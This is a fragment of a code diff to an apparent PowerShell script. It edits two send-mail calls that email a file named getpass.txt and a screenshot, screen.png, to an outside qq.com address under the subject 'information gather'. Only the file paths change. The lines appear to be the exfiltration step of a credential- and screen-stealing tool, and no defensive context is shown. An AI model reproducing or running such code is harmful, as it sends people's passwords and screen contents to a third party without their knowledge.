@@ -46,5 +46,5 @@ function send-mail{
 	}
 }
 
-send-mail -toaddress 3170096510@qq.com -subject "getpass" -body "information gather" -file "e:\getpass.txt"
-send-mail -toaddress 3170096510@qq.com -subject "screen" -body "information gather" -file "e:\screen.png"
+send-mail -toaddress 3170096510@qq.com -subject "getpass" -body "information gather" -file "c:\getpass.txt"
+send-mail -toaddress 3170096510@qq.com -subject "screen" -body "information gather" -file "c:\screen.png"
